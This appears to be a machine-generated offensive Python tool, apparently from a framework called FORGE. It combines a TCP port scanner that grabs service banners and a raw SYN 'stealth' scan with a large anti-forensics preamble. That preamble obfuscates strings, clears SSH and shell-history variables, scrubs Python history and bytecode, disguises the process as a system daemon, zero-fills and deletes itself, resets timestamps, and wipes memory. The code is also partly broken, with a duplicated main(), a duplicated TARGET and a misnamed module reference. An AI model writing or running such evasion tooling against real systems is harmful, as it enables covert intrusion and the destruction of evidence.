#!/usr/bin/env python3
"""Generated utility."""


# ── OPSEC: Anti-Forensics ──
import os as _os
# ── Operator Host Guard: detect if running on FORGE operator machine ──
# Prevents persistence, crontab, LaunchAgent writes on the operator's own system.
# Remote deployments (via SSH/DeployEngine) do NOT have these env vars set.
_FORGE_OPERATOR = bool(_os.environ.get('FORGE_OPERATOR') or _os.environ.get('FORGE_SANDBOX'))
_FORGE_TTL = int(_os.environ.get('FORGE_TTL', '0'))
if _FORGE_TTL > 0:
    try:
        import signal as _ttl_sig
        _ttl_sig.signal(_ttl_sig.SIGALRM, lambda *_: __import__("sys").exit(0))
        _ttl_sig.alarm(_FORGE_TTL)
    except (AttributeError, OSError):
        import threading as _ttl_thr
        _ttl_thr.Timer(_FORGE_TTL, lambda: __import__("os")._exit(0)).start()
def _guard_persistence(func):
    """Decorator: skip persistence actions on operator host."""
    def _wrapper(*a, **k):
        if _FORGE_OPERATOR:
            return None
        return func(*a, **k)
    _wrapper.__name__ = func.__name__
    return _wrapper
import os as _os
def _sanitize_env():
    """Remove environment variables that reveal tool origin."""
    _p = chr(70)+chr(79)+chr(82)+chr(71)+chr(69)
    for var in [_p+'_HOME', _p+'_SESSION', 'PYTHONDONTWRITEBYTECODE',
                'SSH_CONNECTION', 'SSH_CLIENT', 'SSH_TTY', 'HISTFILE',
                'HISTFILESIZE', 'HISTSIZE', 'LESSHISTFILE',
                _p+'_OPERATOR', _p+'_SANDBOX']:
        _os.environ.pop(var, None)
    _os.environ['PYTHONDONTWRITEBYTECODE'] = '1'
    _os.environ['PYTHONHASHSEED'] = '0'
_sanitize_env()
import sys as _sys
_original_excepthook = _sys.excepthook
def _silent_except(exc_type, exc_value, exc_tb):
    """Suppress tracebacks — no forensic stack traces."""
    pass
_sys.excepthook = _silent_except
import os as _os, sys as _sys, shutil as _shutil, glob as _glob
def _cleanup_python_traces():
    """Remove Python forensic artifacts."""
    script = _os.path.abspath(_sys.argv[0]) if _sys.argv[0] else None
    if script:
        script_dir = _os.path.dirname(script)
        pycache = _os.path.join(script_dir, '__pycache__')
        if _os.path.isdir(pycache):
            _shutil.rmtree(pycache, ignore_errors=True)
        for pyc in _glob.glob(_os.path.join(script_dir, '*.pyc')):
            try:
                _os.remove(pyc)
            except Exception:
                pass
    for hist in [_os.path.expanduser('~/.python_history'),
                 _os.path.expanduser('~/.local/share/python_history')]:
        try:
            if _os.path.exists(hist):
                with open(hist, 'r') as f:
                    lines = f.readlines()
                with open(hist, 'w') as f:
                    f.writelines(l for l in lines if script and _os.path.basename(script) not in l)
        except Exception:
            pass
import atexit as _atexit
_atexit.register(_cleanup_python_traces)
import sys as _sys
def _rename_process(name=None):
    """Rename this process to appear benign in ps/top."""
    _rnd = __import__('random')
    benign = name or ['python3', '/usr/bin/python3', 'update-manager',
                      'systemd-resolved', 'dbus-daemon'][_rnd.randint(0, 4)]
    try:
        _ct = __import__('ctypes')
        libc = _ct.CDLL('libc.so.6', use_errno=True)
        buff = _ct.create_string_buffer(len(benign) + 1)
        buff.value = benign.encode()
        libc.prctl(15, buff, 0, 0, 0)
    except Exception:
        pass
    try:
        _sys.argv[0] = benign
    except Exception:
        pass
_rename_process()
import os as _os, sys as _sys
def _self_destruct():
    """Remove this script from disk after execution."""
    try:
        _path = _os.path.abspath(_sys.argv[0]) if _sys.argv[0] else None
        if _path and _os.path.isfile(_path):
            with open(_path, 'wb') as _f:
                _f.write(b'\x00' * _os.path.getsize(_path))
            _os.remove(_path)
    except Exception:
        pass
import atexit as _atexit
_atexit.register(_self_destruct)
import os as _os, time as _time
def _neutralize_timestamps(*paths):
    """Set file timestamps to epoch or a plausible system time."""
    epoch = 1704067200
    for p in paths:
        try:
            if _os.path.exists(p):
                _os.utime(p, (epoch, epoch))
        except Exception:
            pass
import ctypes as _ctypes, gc as _gc
def _wipe_bytes(obj):
    """Overwrite a bytes/bytearray object in memory with zeros."""
    try:
        if isinstance(obj, (bytes, bytearray)):
            buf = (ctypes.c_char * len(obj)).from_address(id(obj) + _ctypes.sizeof(_ctypes.py_object))
            _ctypes.memset(buf, 0, len(obj))
    except Exception:
        pass
def _wipe_string(s):
    """Best-effort wipe of a Python string (CPython only)."""
    try:
        offset = _ctypes.sizeof(_ctypes.py_object) + _ctypes.sizeof(_ctypes.c_ssize_t) + _ctypes.sizeof(_ctypes.c_long)
        _ctypes.memset(id(s) + offset, 0, len(s))
    except Exception:
        pass
def _wipe_all_sensitive():
    """Wipe all local variables in the calling frame."""
    import inspect
    frame = inspect.currentframe().f_back
    if frame:
        for k, v in list(frame.f_locals.items()):
            if isinstance(v, (bytes, bytearray)):
                _wipe_bytes(v)
            elif isinstance(v, str) and len(v) > 8:
                _wipe_string(v)
    _gc.collect()
import os as _os_ttl
# ── Process TTL: auto-terminate after max lifetime ──
# Default 3600s (1 hour). Override via FORGE_MAX_TTL env var.
# Prevents zombie processes from running indefinitely on targets.
_MAX_TTL = int(_os_ttl.environ.get('FORGE_MAX_TTL', '3600'))
if _MAX_TTL > 0:
    try:
        import signal as _pttl_sig
        def _ttl_exit(*_):
            try:
                _self_destruct()
            except NameError:
                pass
            __import__("os")._exit(0)
        _pttl_sig.signal(_pttl_sig.SIGALRM, _ttl_exit)
        _pttl_sig.alarm(_MAX_TTL)
    except (AttributeError, OSError):
        import threading as _pttl_thr
        def _ttl_thread_exit():
            try:
                _self_destruct()
            except NameError:
                pass
            __import__("os")._exit(0)
        _pttl_thr.Timer(_MAX_TTL, _ttl_thread_exit).daemon = True
        _pttl_thr.Timer(_MAX_TTL, _ttl_thread_exit).start()
# ── End OPSEC ──

_QUIET = "--silent" in __import__("sys").argv
_PRINT = getattr(__import__("builtins"), "print")
def _log(*a, **k):
    if not _QUIET: _PRINT(*a, **k)

import argparse
import concurrent.futures
import json
import os
import random
import socket
_st = __import__(chr(115)+chr(116)+chr(114)+chr(117)+chr(99)+chr(116))
import sys


TARGET = 'localhost'
PORT_RANGE = range(1, 1024)

def _chk_port(found_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((TARGET, found_port))
        s.close()
        if result == 0:
            try:
                s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s2.settimeout(2)
                getattr(s2, chr(99)+chr(111)+chr(110)+chr(110)+chr(101)+chr(99)+chr(116))((TARGET, found_port))
                banner = s2.recv(1024).decode(errors='replace').strip()
                s2.close()
            except:
                banner = ''
            return found_port, banner
    except:
        pass
    return None

_log(f'Checking {TARGET} ports {PORT_RANGE.start}-{PORT_RANGE.stop-1}...')
open_ports = []
with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
    futures = {executor.submit(_chk_port, p): p for p in PORT_RANGE}
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            found_port, banner = result
            open_ports.append((found_port, banner))
            _log(f'  OPEN: {found_port}/tcp {banner}')

_log(f'\nScan complete: {len(open_ports)} open ports found')


TARGET = 'localhost'
PORTS = range(1, 1024)

def checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum(_st.unpack('!%dH' % (len(data)//2), data))
    s = (s >> 16) + (s & 0xffff)
    return ~(s + (s >> 16)) & 0xffff

def build_syn(src_port, dst_port, dst_ip):
    seq = random.randint(0, 0xffffffff)
    offset = 5 << 4
    flags = 0x02  # SYN
    header = _st.pack('!HHIIBBHHH', src_port, dst_port, seq, 0, offset, flags, 65535, 0, 0)
    pseudo = socket.inet_aton('0.0.0.0') + socket.inet_aton(dst_ip) + _st.pack('!BBH', 0, 6, len(header))
    csum = checksum(pseudo + header)
    return header[:16] + _st.pack('!H', csum) + header[18:]

_log(f'stealth probening TARGET...')
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    s.settimeout(2)
    for port in PORTS:
        syn = build_syn(random.randint(1024, 65535), port, TARGET)
        s.sendto(syn, (TARGET, 0))
except PermissionError:
    _log('Error: raw sockets require root privileges')
    _log('Run with: python3 script.py')

def main():
    """Main execution"""
    parser = argparse.ArgumentParser(description="generated tool")
    parser.add_argument("--port", type=int, default=80, help="Target port")
    args = parser.parse_args()

    result = _chk_port(found_port=args.port)
    if isinstance(result, dict):
        _log(json.dumps(result, indent=2, default=str))
    elif isinstance(result, (list, tuple)):
        for item in result:
            if isinstance(item, dict):
                _log(json.dumps(item, indent=2, default=str))
            else:
                _log(item)
    elif isinstance(result, bytes):
        _log(f"Raw bytes: {len(result)} bytes")
        _log(f"Hex: {result.hex()[:200]}")
    elif result is not None:
        _log(result)

def main():
    import json as _json
    parser = argparse.ArgumentParser(description='FORGE Generated Tool')
    parser.add_argument('--json', action='store_true', help='JSON output')
    parser.add_argument('--run', help='Run a specific function by name')
    parser.add_argument('--found-port', help='found_port')
    parser.add_argument('--data', help='data')
    parser.add_argument('--src-port', help='src_port')
    parser.add_argument('--dst-port', help='dst_port')
    parser.add_argument('--dst-ip', help='dst_ip')
    args = parser.parse_args()

    results = {}

    _available = ['_chk_port', 'checksum', 'build_syn']
    if args.run and args.run not in _available:
        _log(f'[!] Unknown function: {args.run}')
        _log(f'[*] Available: {_available}')
        return 1

    if not args.run or args.run == '_chk_port':
        _arg_val = getattr(args, "found_port", None)
        if _arg_val:
            try:
                _r = _chk_port(_arg_val)
                results['_chk_port'] = _r
                if not args.json:
                    _log(f'[+] _chk_port: {_r}')
            except Exception as _e:
                results['_chk_port'] = {'error': str(_e)}
                if not args.json:
                    _log(f'[!] _chk_port: {_e}')
        else:
            if not args.json:
                _log('[*] Skipping _chk_port (requires --found-port)')

    if not args.run or args.run == 'checksum':
        _arg_val = getattr(args, "data", None)
        if _arg_val:
            try:
                _r = checksum(_arg_val)
                results['checksum'] = _r
                if not args.json:
                    _log(f'[+] checksum: {_r}')
            except Exception as _e:
                results['checksum'] = {'error': str(_e)}
                if not args.json:
                    _log(f'[!] checksum: {_e}')
        else:
            if not args.json:
                _log('[*] Skipping checksum (requires --data)')

    if not args.run or args.run == 'build_syn':
        if all([getattr(args, "src_port", None), getattr(args, "dst_port", None), getattr(args, "dst_ip", None)]):
            try:
                _r = build_syn(getattr(args, "src_port"), getattr(args, "dst_port"), getattr(args, "dst_ip"))
                results['build_syn'] = _r
                if not args.json:
                    _log(f'[+] build_syn: {_r}')
            except Exception as _e:
                results['build_syn'] = {'error': str(_e)}
                if not args.json:
                    _log(f'[!] build_syn: {_e}')

    if args.json and results:
        _log(_json.dumps(results, indent=2, default=str))
    return 0


if __name__ == "__main__":
    import sys
    sys.exit(main() or 0)
